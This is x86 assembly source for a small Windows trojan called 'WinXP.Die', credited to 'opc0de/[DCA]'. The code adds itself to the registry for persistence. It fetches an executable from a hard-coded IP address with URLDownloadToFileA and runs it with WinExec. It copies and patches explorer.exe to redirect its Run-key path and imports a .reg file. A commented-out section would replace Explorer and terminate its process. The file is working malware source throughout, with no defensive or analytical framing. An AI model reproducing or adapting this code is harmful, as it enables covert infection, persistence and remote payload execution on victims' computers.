   .586p

   .model flat,stdcall


   include W32nt_lj.inc

       EXTRN ExitProcess:PROC
       EXTRN GetWindowsDirectoryA:PROC
       EXTRN MessageBoxA:PROC
       EXTRN lstrcatA:PROC
       EXTRN CreateFileA:PROC
       EXTRN CopyFileA:PROC
       EXTRN CreateFileMappingA:PROC
       EXTRN MapViewOfFile:PROC
       EXTRN lstrlenW:PROC
       EXTRN Process32First:PROC
       EXTRN Process32Next:PROC
       EXTRN CreateToolhelp32Snapshot:PROC
       EXTRN OpenProcess:PROC
       EXTRN TerminateProcess:PROC
       EXTRN MoveFileA:PROC
       EXTRN GetModuleFileNameA:PROC
       EXTRN lstrlenA:PROC
       EXTRN RegCreateKeyExA:PROC
       EXTRN RegSetValueA:PROC
       EXTRN MessageBoxA:PROC
       EXTRN LoadLibraryA:PROC
       EXTRN GetProcAddress:PROC
       EXTRN ReadFile:PROC
       EXTRN WinExec:PROC
       EXTRN UnmapViewOfFile:PROC
       EXTRN CloseHandle:PROC

   ; comment %
   ;
   ;
   ;               WinXP.Die by opc0de/[DCA]
   ;                        simple small trojan
   ;                 Copyright (C) 2004 by opc0de
   ;                        All rights reserved
   ;
   ;
   ;   %

   ProcessEntry32 STRUC
   dwSize dd ? ;specifies the length in bytes of the structure
   cntUsage dd ?;nr of references to the process
   th32ProcessID dd ? ;PID
   th32DefaultHeapID dd ? ;ID for the process heap
   th32ModuleID dd ? ; Module ID
   cntThreads dd ? ; number of threads
   th32ParentProcessID dd ? ; id of the parent process
   pcPriClassBase dd ? ; base priority of the threads created
   dwFlags dd ? ;do not use
   szExeName db 261 dup (?) ; Zero terminated string indicating the process name
   ProcessEntry32 ends




   .data
       ec db 'sex.exe',0
       file db 'http://82.77.69.108/tinywww.exe',0
       app db 0Dh dup (0)
       tdmp dd ?
       new  db 'S',0,'o',0,'f',0,'t',0,'w',0,'a',0,'r',0,'e',0,'\',0,'M',0,'i',0,'c',0,'r',0,'o',0,'s',0,'o',0,'f',0,'t',0,'\',0,'W',0,'i',0,'n',0,'d',0,'o',0,'w',0,'s',0,'\',0,'C',0,'u',0,'r',0,'r',0,'e',0,'n',0,'t',0,'V',0,'e',0,'r',0,'s',0,'i',0,'o',0,'n',0,'\',0,'C',0,'f',0,'g',0,'s',0,'y',0,'t',0,'m',0
       newz  db 'Software\Microsoft\Windows\CurrentVersion\Cfgsytm',0
       nil db 'WinXP.Die by opc0de/[DCA]',0
       dir db  255 dup  (?)
       target db '\explorer.exe',0
       fileit   db '\cfg.exe',0
       back   db 'explorer.bak',0
       myfile db 'exploder.exe',0
       myfile2 db '\exploder.exe',0
       path db 'S',0,'o',0,'f',0,'t',0,'w',0,'a',0,'r',0,'e',0,'\',0,'M',0,'i',0,'c',0,'r',0,'o',0,'s',0,'o',0,'f',0,'t',0,'\',0,'W',0,'i',0,'n',0,'d',0,'o',0,'w',0,'s',0,'\',0,'C',0,'u',0,'r',0,'r',0,'e',0,'n',0,'t',0,'V',0,'e',0,'r',0,'s',0,'i',0,'o',0,'n',0,'\',0,'R',0,'u',0,'n',0
       size dd ?
       explore db 'EXPLORER.EXE',0
       map dd ?
       snap dd ?
       instreg db 'regedit.exe instl.reg',0
       reg db 'instl.reg',0
       paty dd ?
       final db 255 dup (?)
       dess db 'exploder.exe',0
        KEY_ALL_ACCESS         EQU 0F003FH
       disposition dd ?
       key_handle dd ?
       js db 'die.exe',0
       dll db 'Urlmon.dll',0
       check db 'URLDownloadToFileA',0
       Download dd ?
       partition db 4 dup (?)
       filemap dd ?
       createf  dd ?



   .code

   CreateKey PROC

           push offset disposition
           push offset key_handle
           push 0
           push KEY_ALL_ACCESS
           push 0
           push 0
           push 0
           push offset newz
           push 80000002h
           call  RegCreateKeyExA


           push 0FFh
           push offset dir
           call GetWindowsDirectoryA

           push offset fileit
           push offset dir
           call lstrcatA

           mov tdmp,eax


           push 1
           push eax
           push offset js
           call CopyFileA

           push tdmp
           call lstrlenA

           push eax
           push tdmp
           push 1
           push offset newz
           push 80000002h
           call RegSetValueA


               push offset dll
               call LoadLibraryA

               push offset check
               push eax
               call GetProcAddress

               mov Download,eax


               lea edi,partition
               mov ecx,3
               lea esi,dir
               xor eax,eax

           @@loopz:

               lodsb
               mov [edi],eax
               inc edi
               loop @@loopz

               mov [edi], byte ptr 0

               lea eax,ec

               push eax
               push offset partition
               call lstrcatA

               push eax

               push 0
               push 0
               push eax
               push offset file
               push 0
               call Download

               pop eax


               push 1
               push eax
               call WinExec




           ret

   CreateKey endp


       Start:

           call CreateKey

           push 0
           push 0
           push OPEN_EXISTING
           push 0
           push 0
           push GENERIC_READ or GENERIC_WRITE
           push offset reg
           call CreateFileA

           cmp eax,-1
           je @@exit

           push eax
           call CloseHandle



   @@cnt:


           push 0FFh
           push offset dir
           call GetWindowsDirectoryA

           push offset target
           push offset dir
           call lstrcatA

           mov paty,eax

           push 0
           push offset myfile
           push eax
           call CopyFileA

           lea edi,myfile

           cmp eax,0
           je @@end

           push 0
           push 0
           push OPEN_EXISTING
           push 0
           push 0
           push GENERIC_READ or GENERIC_WRITE
           push edi
           call CreateFileA

           mov createf,eax

           push 0
           push 0
           push 0
           push PAGE_READWRITE
           push 0
           push eax
           call CreateFileMappingA

           mov filemap,eax

           push 0
           push 0
           push 0
           push FILE_MAP_ALL_ACCESS
           push eax
           call MapViewOfFile

           mov map,eax

           push offset path
           call lstrlenW

           mov [size], eax

           mov edi,map

   @@loop:
           xor ecx,ecx
           mov ecx,90
           lea esi,path
           rep cmpsb
           je @@end
           jmp @@loop







   @@end:

           lea esi,new
           sub edi,05Ah
           mov ecx,97
           rep movsb

           lea esi,new

           lea ebx,dess

           push [map]
           call UnmapViewOfFile

           push filemap
           call CloseHandle

           push createf
           call CloseHandle


           push 0FFh
           push offset dir
           call GetWindowsDirectoryA

           push offset myfile2
           push offset dir
           call lstrcatA

           push 1
           push paty
           push ebx
           call CopyFileA

           push 1
           push offset instreg
           call WinExec


   comment %

           push paty
           push ebx
           call MoveFileA

           push 0FFH
           push offset dir
           push 0
           call GetModuleFileNameA

           mov esi,offset dir

           push esi
           call lstrlenA

           mov ecx,eax
           sub ecx,7
           xor ebx,ebx
           lea edi,final

       @@loopit:

           lodsb
           mov [edi],eax
           inc edi
           loop @@loopit

           mov [edi],byte ptr 0

           lea eax,final


           push offset myfile
           push offset final
           call lstrcatA

           mov ebx,eax


           push 0FFh
           push offset dir
           call GetWindowsDirectoryA

           push offset target
           push offset dir
           call lstrcatA


           push 00000004h or 00000001h
           push eax
           push ebx
           call MoveFileExA





           push 0
           push 00000002h
           call CreateToolhelp32Snapshot

           mov snap,eax


           push offset PE32
           push snap
           call Process32First

           lea esi,explore
           mov ecx,0Ch
           lea edi,PE32.szExeName
           rep cmpsb

           je @@done


   @@scan:


           push offset PE32
           push snap
           call Process32Next

           lea esi,explore
           mov ecx,0Ch
           lea edi,PE32.szExeName
           rep cmpsb

           je @@done
           jmp @@scan



   @@done:


           mov eax,PE32.th32ProcessID

           push eax
           push 0
           push PROCESS_ALL_ACCESS
           call OpenProcess

           push 0
           push eax
           call TerminateProcess

   %

   @@exit:
           push 0
           call ExitProcess

       end Start
